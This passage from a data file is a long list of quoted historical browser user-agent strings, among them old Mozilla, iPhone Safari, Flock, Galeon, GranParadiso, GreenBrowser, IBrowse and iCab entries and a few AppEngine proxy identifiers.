"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:0.9.5) Gecko/20011011",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.4) Gecko/20010923",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801",
"Mozilla/5.0 (Macintosh; U; PPC; en-US; rv:0.9.3) Gecko/20010802",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.2.1) Gecko/20010901",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.2.1) Gecko/20010901",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.2) Gecko/20010809",
"Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16",
"Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B143 Safari/8536.25",
"Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B142 Safari/8536.25",
"Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A523 Safari/8536.25",
"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5",
"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7",
"Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B144 Safari/8536.25",
"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
"Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A551 Safari/8536.25",
"Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3",
"Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 like Mac OS X; en-us) AppleWebKit/536.26 (KHTML, like Gecko) CriOS/23.0.1271.100 Mobile/10B143 Safari/8536.25",
"Mozilla/5.0 (iPad; CPU iPhone OS 501 like Mac OS X) AppleWebKit/534.46 (KHTML like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3",
"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3",
"Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B141 Safari/8536.25",
"Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25",
"Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_0 like Mac OS X; en) AppleWebKit/528.18 (KHTML, like Gecko) Version/5.1 Mobile/7A341 Safari/528.16",
"Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/7.2 Mobile/10A523 Safari/8536.25",
"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",
"Mozilla/5.0 (iPhone; CPU iPhone OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3",
"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190",
"Mozilla/5.001 (Macintosh; N; PPC; ja) Gecko/25250101",
"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.11) Gecko/20080126 Firefox/2.0.0.11 Flock/1.0.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20080126 Firefox/2.0.0.11 Flock/1.0.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071231 Firefox/2.0.0.11 Flock/1.0.5",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.11) Gecko/20071206 Firefox/2.0.0.11 Flock/1.0.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.9) Gecko/20071106 Firefox/2.0.0.9 Flock/1.0.1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1.8) Gecko/20071101 Firefox/2.0.0.8 Flock/1.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.7) Gecko/20071013 Firefox/2.0.0.7 Flock/0.9.1.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.7) Gecko/20070925 Firefox/2.0.0.7 Flock/0.9.1.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.6) Gecko/20070914 Firefox/2.0.0.6 Flock/0.9.1.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070801 Firefox/2.0.0.6 Flock/0.9.0.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.4) Gecko/20070707 Firefox/2.0.0.4 Flock/0.9.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.2) Gecko/20070307 Firefox/2.0.0.2 Flock/0.7.99",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; ","rv:1.8.0.9pre) Gecko/20061219 Firefox/1.5.0.9 Flock/0.7.9.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.9) Gecko/20061219 Flock/0.7.9.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8 Flock/0.7.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20061025 Firefox/1.5.0.8 Flock/0.7.8",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.0.8) Gecko/20061109 Firefox/1.5.0.8 Flock/0.7.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060929 Firefox/1.5.0.7 Flock/0.7.6",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060915 Firefox/1.5.0.7 Flock/0.7.5.1",
"Mozilla/5.0 (X11; U; Linux ia64; pl; rv:1.8.0.5) Gecko/20060801 Firefox/1.5.0.5 Flock/0.7.4.1",
"Mozilla/5.0 (X11; U; Linux i686; pl; rv:1.8.0.5) Gecko/20060801 Firefox/1.5.0.5 Flock/0.7.4.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.8.0.5) Gecko/20060801 Firefox/1.5.0.5 Flock/0.7.4.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.0.12) Gecko/20070530 Firefox/1.5.0.12 Flock/0.7.14",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.11) Gecko/20070501 Firefox/1.5.0.11 Flock/0.7.13.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.11) Gecko/20070502 Firefox/1.5.0.11 Flock/0.7.13.1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.0.11) Gecko/20070321 Firefox/1.5.0.11 Flock/0.7.12",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.10) Gecko/20070228 Firefox/1.5.0.10 Flock/0.7.11",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.4) Gecko/20060620 Firefox/1.5.0.4 Flock/0.7.1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.4) Gecko/20060620 Firefox/1.5.0.4 Flock/0.7.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.4) Gecko/20060612 Firefox/1.5.0.4 Flock/0.7.0.17.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.4) Gecko/20060612 Firefox/1.5.0.4 Flock/0.7.0.17.1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.4) Gecko/20060612 Firefox/1.5.0.4 Flock/0.7.0.17.1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.1) Gecko/20060331 Flock/0.7",
"Mozilla/5.0 (X11; U; Linux i686; pl; rv:1.8.0.1) Gecko/20060314 Flock/0.5.13.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060314 Flock/0.5.13.2",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.1) Gecko/20060314 Flock/0.5.13.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060217 Flock/0.5.11",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.1) Gecko/20060217 Flock/0.5.11",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8) Gecko/20060102 Flock/0.4.11 Firefox/1.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051119 Flock/0.4.11 Firefox/1.0+",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8b5) Gecko/20051019 Flock/0.4 Firefox/1.0+",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b5) Gecko/20051103 Flock/0.4 Firefox/1.0+",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b5) Gecko/20051021 Flock/0.4 Firefox/1.0+",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b5) Gecko/20051021 Flock/0.4 Firefox/1.0+",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; nl-nl) AppleWebKit/532.3+ (KHTML, like Gecko) Fluid/0.9.6 Safari/532.3+",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; nl-nl) AppleWebKit/531.9 (KHTML, like Gecko) Fluid/0.9.6 Safari/531.9",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/528.16 (KHTML, like Gecko) Fluid/0.9.6 Safari/528.16",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Fluid/0.9.4 Safari/525.13",
"Galaxy/1.0 [en] (Mac OS X 10.5.6; U; en)",
"Galaxy/1.0 [en] (Mac OS X 10.5.6)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.7) Gecko Galeon/2.0.6 (Debian 2.0.6-2.1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.10) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2.1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081216 Galeon/2.0.4 Firefox/2.0.0.19",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.4",
"Mozilla/5.0 (X11; U; Linux sparc64; en-GB; rv:1.8.1.11) Gecko/20071217 Galeon/2.0.3 Firefox/2.0.0.11",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4) Gecko/20070508 (Debian-1.8.1.4-3) Galeon/2.0.2 (Debian package 2.0.2-4)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.4) Gecko/20060627 Galeon/2.0.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.13pre) Gecko/20080207 Galeon/2.0.1 (Ubuntu package 2.0.1-1ubuntu2) Firefox/1.5.0.13pre",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/Debian-1.8.0.1-5 Galeon/2.0.1 (Debian package 2.0.1-3)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060027 (Debian-1.8.0.1-11) Galeon/2.0.1 (Debian package 2.0.1-3)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.13) Gecko/20060501 Galeon/2.0.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20060122 Galeon/2.0.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051007 Galeon/2.0.0 (Debian package 2.0.0-1)",
"Mozilla/5.0 (X11; U; Linux i686) Gecko/20030430 Galeon/1.3.4 Debian/1.3.4.20030509-1",
"Mozilla/5.0 (X11; U; Linux i686) Gecko/20030327 Galeon/1.3.4 Debian/1.3.3.20030419-1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20050929 Galeon/1.3.21",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.7.12) Gecko/20051007 Galeon/1.3.21 (Debian package 1.3.21-8)",
"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.12) Gecko/20051105 Galeon/1.3.21",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050718 Galeon/1.3.20 (Debian package 1.3.20-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050513 Galeon/1.3.20 (Debian package 1.3.20-1)",
"Mozilla/5.0 (X11; U; Linux i686; hu; rv:1.7.3) Gecko/20050130 Galeon/1.3.19",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.3) Gecko/20041007 Galeon/1.3.18 (Debian package 1.3.18-1.1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.2) Gecko/20040906 Galeon/1.3.17",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040510 Galeon/1.3.16",
"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
"Mozilla/5.0 Galeon/1.2.8 (X11; Linux i686; U;) Gecko/20030317",
"Mozilla/5.0 Galeon/1.2.8 (X11; Linux i686; U;) Gecko/20030212",
"Mozilla/5.0 Galeon/1.2.7 (X11; Linux i686; U;) Gecko/20021226 Debian/1.2.7-6",
"Mozilla/5.0 Galeon/1.2.6 (X11; Linux i686; U;) Gecko/20020916",
"Mozilla/5.0 Galeon/1.2.6 (X11; Linux i686; U;) Gecko/20020913 Debian/1.2.6-2",
"Mozilla/5.0 Galeon/1.2.6 (X11; Linux i686; U;) Gecko/20020830",
"Mozilla/5.0 Galeon/1.2.6 (X11; Linux i686; U;) Gecko/20020827",
"Mozilla/5.0 Galeon/1.2.6 (X11; Linux i586; U;) Gecko/20020916",
"Mozilla/5.0 Galeon/1.2.5 (X11; Linux i686; U;) Gecko/20020809",
"Mozilla/5.0 Galeon/1.2.5 (X11; Linux i686; U;) Gecko/20020623 Debian/1.2.5-0.woody.1",
"Mozilla/5.0 Galeon/1.2.5 (X11; Linux i686; U;) Gecko/20020610 Debian/1.2.5-1",
"Mozilla/5.0 Galeon/1.2.5 (X11; Linux i686; U;) Gecko/0",
"Mozilla/5.0 Galeon/1.2.5 (X11; Linux i586; U;) Gecko/20020623 Debian/1.2.5-0.woody.1",
"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0",
"Mozilla/5.0(X11;U;Linux(x86_64);en;rv:1.9a8)Gecko/2007100619;GranParadiso/3.1",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.0a8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a7) Gecko/2007080210 GranParadiso/3.0a7",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a5) Gecko/20070605 GranParadiso/3.0a5",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9a4) Gecko/20070427 GranParadiso/3.0a4",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a4) Gecko/20070427 GranParadiso/3.0a4",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a4) Gecko/2007042705 GranParadiso/3.0a4",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a4) Gecko/20070427 GranParadiso/3.0a4",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3) Gecko/20070322 GranParadiso/3.0a3",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a3) Gecko/20070322 GranParadiso/3.0a3",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a2) Gecko/20070206 GranParadiso/3.0a2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a1) Gecko/20061204 GranParadiso/3.0a1",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9a1) Gecko/20061204 GranParadiso/3.0a1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9a1) Gecko/20061204 GranParadiso/3.0a1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a1) Gecko/20061204 GranParadiso/3.0a1 MEGAUPLOAD 1.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a1) Gecko/20061204 GranParadiso/3.0a1",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.9a1) Gecko/20061204 GranParadiso/3.0a1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.9a1) Gecko/20061204 GranParadiso/3.0a1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042210 GranParadiso/3.0.9",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.8) Gecko/2009033008 GranParadiso/3.0.8",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/2009033017 GranParadiso/3.0.8",
"Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.9.0.8) Gecko/2009033017 GranParadiso/3.0.8",
"Mozilla/5.0 (X11; U; Darwin i386; en-US; rv:1.9.0.8) Gecko/2009040414 GranParadiso/3.0.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.0.7pre) Gecko/2009012106 GranParadiso/3.0.7pre",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.0.7) Gecko/2009030719 GranParadiso/3.0.7 FirePHP/0.2.4",
"Mozilla/5.0 (X11; U; Linux i686; fr-FR; rv:1.9.0.7) Gecko/2009030719 GranParadiso/3.0.7",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.7) Gecko/2009030719 GranParadiso/3.0.7 FirePHP/0.2.4",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.4pre) Gecko/2008092704 GranParadiso/3.0.4pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.4pre) Gecko/2008102405 GranParadiso/3.0.4pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.4pre) Gecko/2008101305 GranParadiso/3.0.4pre",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3pre) Gecko/2008092604 GranParadiso/3.0.3pre",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3pre) Gecko/2008091304 GranParadiso/3.0.3pre",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.3pre) Gecko/2008090704 GranParadiso/3.0.3pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.2pre) Gecko/2008072405 GranParadiso/3.0.2pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.2pre) Gecko/2008071405 GranParadiso/3.0.2pre",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1) Gecko/2008071818 GranParadiso/3.0.1",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9) Gecko/20070314 GranParadiso/3.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.9a3) Gecko/20070409 GranParadiso/2.0.0.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.9a1) Gecko/20061204 GranParadiso/2.0",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506; Media Center PC 5.0; .NET CLR 3.5.21022; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; InfoPath.2; .NET CLR 3.0.30729; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; OfficeLiveConnector.1.4; OfficeLivePatch.1.3; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB6; .NET CLR 2.0.50727; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB6; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB6.3; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB0.0; InfoPath.1; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 4.0.20506; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322; InfoPath.2; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; InfoPath.1; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 1.1.4322; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 1.1.4322; .NET CLR 3.0.04506.648; InfoPath.1; GreenBrowser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; GreenBrowser)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.9 (KHTML, like Gecko) Hana/1.1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/417.9 (KHTML, like Gecko) Hana/1.0",
"Mozilla/5.0 (Macintosh; U; i386 Mac OS X; en) AppleWebKit/417.9 (KHTML, like Gecko) Hana/1.0",
"HotJava/1.1.2 FCS",
"HotJava/1.0.1/JRE1.1.x",
"IBM WebExplorer /v0.94",
"Mozilla/5.0 (compatible; IBrowse 3.0; AmigaOS4.0)",
"IBrowse/2.4demo (AmigaOS 3.9; 68K)",
"IBrowse/2.4 (AmigaOS 3.9; 68K)",
"Mozilla/4.0 (compatible; IBrowse 2.3; AmigaOS4.0)",
"IBrowse/2.3 (AmigaOS 3.9)",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_8) AppleWebKit/537.3+ (KHTML, like Gecko) iCab/5.0 Safari/533.16",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_8) AppleWebKit/537.1+ (KHTML, like Gecko) iCab/5.0 Safari/533.16",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_8) AppleWebKit/536.25+ (KHTML, like Gecko) iCab/5.0 Safari/533.16",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_8) AppleWebKit/536.17+ (KHTML, like Gecko) iCab/5.0 Safari/533.16",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_8) AppleWebKit/536.15+ (KHTML, like Gecko) iCab/5.0 Safari/533.16",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_8) AppleWebKit/534.50.2 (KHTML, like Gecko) iCab/5.0 Safari/533.16",
